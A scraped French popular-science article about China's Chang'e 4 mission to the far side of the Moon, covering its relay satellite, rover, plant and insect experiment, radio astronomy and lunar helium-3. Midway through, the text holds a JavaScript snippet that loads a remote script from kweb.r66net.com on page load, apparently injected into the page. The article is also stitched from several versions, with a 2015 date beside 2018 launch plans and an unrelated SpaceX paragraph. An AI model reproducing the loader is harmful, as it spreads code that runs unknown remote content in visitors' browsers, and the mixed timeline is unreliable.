{"title": "La Chine veut visiter la face cachée de la Lune cette année", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "25/09/2015", "content": "Cette année, la Chine doit lancer une mission inédite vers la face cachée de la Lune et y déposer un rover. Cette mission s'appelle Chang'e 4. C'est une réelle percée dans l'exploration lunaire, un pas important pour le pays ainsi que la communauté scientifique mondiale. Le transit de la Lune devant la Terre filmé depuis l’espace                       Non, cette vidéo n’est pas un montage. C’est bien la face cachée de la Lune qui se révèle, et devant la Terre en plus... Construit avec une série d'images prises par le satellite DSCOVR, ce clip donne un point de vue pour le moins étonnant de notre planète.                                       Parmi la quarantaine de lancements annoncés pour 2018, plusieurs attireront notre attention : le retour en vol du Longue Marche 5 (le plus gros lanceur chinois), mais, surtout, les deux lancements de la mission chinoise Chang'e 4, dont l'objectif est de déposer sur la face cachée de la  Lune  un  rover , du jamais-vu. La  face cachée de la Lune  est d'un très grand intérêt scientifique et y faire rouler un rover devrait permettre un retour très significatif. Cette mission sera réalisée en deux parties, avec un premier lancement en juin et un second dans le courant de l'année. En juin, un satellite de relais de communication de 425 kg s'installera à quelque 60.000 km d'altitude autour de la Lune. La réussite de cette première étape conditionne la suite des opérations. En effet, ce satellite sera utilisé pour relayer les communications entre le rover Chang'e 4 et la  Terre  mais aussi aider à son atterrissage. Le rover de la mission Chang'e 4 ressemblera à Yutu, celui de la mission Chang'e 3, qui, en décembre 2013, avait atterri sur la Lune. Ce dernier avait été construit en double au cas où l'atterrissage n'aurait pas été un succès. © CNSA                               Au sol, le rover étudiera les conditions géologiques propres à ce côté-ci de la Lune. Il faut savoir que la face cachée de notre satellite présente une  géologie  unique, complètement différente de celle de la face visible depuis la Terre : elle possède beaucoup moins de grands cratères et, pour ainsi dire, aucune mer. Elle témoignerait par ailleurs d'une  activité volcanique  relativement récente, pouvant remonter à 100 millions d'années ; elle compte aussi bien plus de cratères d'impacts que la face visible (certains sont très jeunes). Le saviez-vous ? Initialement, explorer la face cachée de la Lune n’était pas prévu dans le programme de la Chine. En fait, la mission Chang'e 4 était initialement destinée à remplacer la précédente, Chang’e 3, dont l’objectif était de déposer à la surface de la Lune le  rover Yutu  (« lapin de jade »), au cas où cette dernière aurait échoué. Comme Chang’e 3 a finalement été un succès en décembre 2013, il a été décidé d’utiliser le deuxième rover pour l’envoyer sur la face cachée de la Lune. Bien que plusieurs emplacements aient été identifiés, le futur site d’atterrissage de Chang’e 4 n’a pas encore été officiellement annoncé.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Tester un écosystème sur la Lune Le rover devrait vérifier si des plantes sont susceptibles d'être cultivées sur la Lune. Pour cela, il embarquera un conteneur rempli de graines, mais aussi d'insectes. Il vérifiera aussi si des vers à soie sont capables d'y produire du dioxyde de carbone et si des pommes de terre et des graines y émettent de l'oxygène par photosynthèse. Enfin, la face cachée de la Lune a un environnement électromagnétique propre, ce qui en fait un site idéal pour l'étude  radio  à basses  fréquences  de l' univers . Le rover pourrait donc embarquer un radiotélescope dont les observations ne seraient pas perturbées par les signaux radio artificiels terrestres et l' ionosphère  de notre Planète. Le professeur d'astrophysique Heino Falcke, de l'université Radboud (Pays-Bas), a récemment déclaré au  Guardian  qu'il était en pourparlers avec les Chinois afin que son radiotélescope soit embarqué sur le rover. L'hélium 3 sera-t-il l'énergie du futur ? Cette mission est également d'un très grand intérêt économique. Il faut savoir que les échantillons ramenés lors des missions Apollo ont démontré que le sol de notre satellite naturel est parsemé d'hélium 3. Or, selon les scientifiques, l'hélium 3 pourrait devenir, dans le futur, le carburant privilégié des centrales nucléaires à fusion contrôlée, permettant de produire des quantités phénoménales d'énergie sans la moindre pollution ni radioactivité. Cet élément est plus abondant sur la Lune que sur Terre, et probablement plus encore sur la face cachée de la Lune. En 2015, Ouyang Ziyuan, le responsable scientifique du  programme chinois d’exploration lunaire , estimait :  « La Lune est tellement riche en hélium 3 que cela pourrait régler le problème des besoins en énergie de l'humanité pour au moins 10.000 ans  ». La Chine, qui a un grand programme de développement de la fusion thermonucléaire, espère pouvoir un jour maîtriser cette source d'énergie en utilisant l'hélium 3 comme combustible. Elle a déjà lancé des recherches sur la possibilité d'ouvrir une mine sur la Lune et l'hélium 3 lunaire est toujours un objectif plus ou moins important dans chaque mission de son programme. Pour en savoir plus La face cachée de la Lune sera bien visitée par la Chine Article de Rémy Decourt publié le 25/09/2015 Dimanche, SpaceX a lancé une capsule Dragon à destination de l'ISS. Cette dixième mission de ravitaillement était aussi le premier lancement depuis le mythique pas de tir 39A d'où ont décollé des missions Apollo, des navettes spatiales et d'où partiront, à partir de mi-2018, des astronautes à bord du Crew Dragon. L'étage principal du Falcon 9 est revenu sans encombre se poser sur la terre ferme. Thomas Pesquet, lui, se prépare à récupérer la capsule. En juillet 2015, de retour d'un  salon du Bourget  marqué par le contrat spatial du siècle pour Airbus Defence & Space qui construira les  900 satellites de OneWeb , nous nous interrogions sur les  ambitions lunaires de la Chine . Avec Philippe Coué, spécialiste français de la Chine spatiale, nous avions annoncé que ce pays s'apprêtait à débarquer sur la face cachée de la Lune. Zou Yongliao, un des responsables des programmes lunaires à l'Académie des sciences chinoises, avait alors confirmé que la prochaine mission lunaire irait effectivement s'y poser avec un rover d'ici la fin de cette décennie. En cas de succès, la Chine deviendrait alors le premier pays à réaliser cet exploit. Cette mission serait réalisée par Chang'e 4, une sonde devant rééditer l' exploit de Chang’e 3  qui a réussi à poser un rover en décembre 2013 sur le côté visible de la Lune. Chang'e 4 devrait être adaptée à sa nouvelle mission et embarquer une charge utile plus importante lui permettant d'étudier la géologie du sol et, très certainement, d'observer l'univers. Pour cette mission, il sera nécessaire d'envoyer un satellite autour de la  Lune  pour relayer les données de Chang'e 4 depuis son site d'atterrissage. Le projet de l' International Lunar Observatory  (ILO) prévoit d'installer un télescope radio autonome sur la Lune. Cet organisme a pu utiliser, en collaboration avec l'Agence spatiale chinoise, le télescope ultraviolet à bord du rover Yutu de la mission Chang'e 3. © ILO                       Un télescope sur la face cachée de la Lune ? Comme le souligne Zou Yongliao, la face cachée de la Lune  « a un environnement électromagnétique propre, ce qui en fait un site idéal pour l'étude radio à basses fréquences de l'univers » . L'idée de la Nasa et l'Esa serait d' implanter  un radio  télescope  autonome à basses fréquences capable d'observer l'univers de 1 à 10 mégahertz, de façon plus claire que depuis la Terre. Cet intérêt pour l'observation du ciel depuis la Lune laisse à penser que la Chine étudie certainement cette possibilité. Cela se produira peut-être avant l'envoi des premières missions habitées d'exploration mais pas avant le  retour d’échantillons  de la face visible, prévu avec Chang'e 5. Le site d'atterrissage de l'appareil de la mission Chang'e 3 (décembre 2013). © CNSA                               « Si nous pouvions installer un  spectrographe  fonctionnant dans ces  longueurs d'ondes , nous comblerions alors un vide » , conclut Yongliao. En effet, ces fréquences basses sont inaudibles depuis la Terre, noyée dans le trafic radio généré par l'activité humaine et perturbé par l'ionosphère terrestre. D'un point de vue scientifique, l'observation dans ces longueurs d'ondes aiderait les astronomes à mieux comprendre la période dite des  Âges sombres  et sa transition vers l'époque de  réionisation  du milieu interstellaire qui a conduit à la formation des premiers objets lumineux. Les astronomes seront également bien mieux armés pour sonder une multitude d' exoplanètes . L'interaction des particules chargées telles que des  électrons  avec le  champ magnétique  de ces planètes devrait ainsi générer des ondes radio de basses fréquences et renseigner les astronomes sur la structure et la composition interne des objets observés. ", "theme": "sciences"}